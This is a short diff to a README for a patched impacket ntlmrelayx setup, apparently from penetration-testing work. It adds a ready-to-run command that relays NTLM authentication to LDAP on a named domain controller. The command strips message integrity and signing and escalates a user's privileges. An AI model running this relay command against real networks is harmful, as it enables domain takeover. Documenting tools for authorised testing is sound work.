@@ -57,6 +57,10 @@ Verify:
    then drop the edited ldaprelayclient.py over it.
 3. Copy smbrelayserver.py to /impacket/impacket/examples/ntlmrelayx/servers/smbrelayserver.py
 
+## Run Da Traack
+``cd /home/abacode/impacket
+sudo .relayz/bin/python examples/ntlmrelayx.py -t ldap://AX-DC01.russfinancial.local --remove-mic --remove-sign-seal --escalate-user pentesting -smb2support``
+
 ## The flags (what you actually pass to ntlmrelayx)
 
 These are stock ntlmrelayx flags, not added by relaytrace. The tracing fires
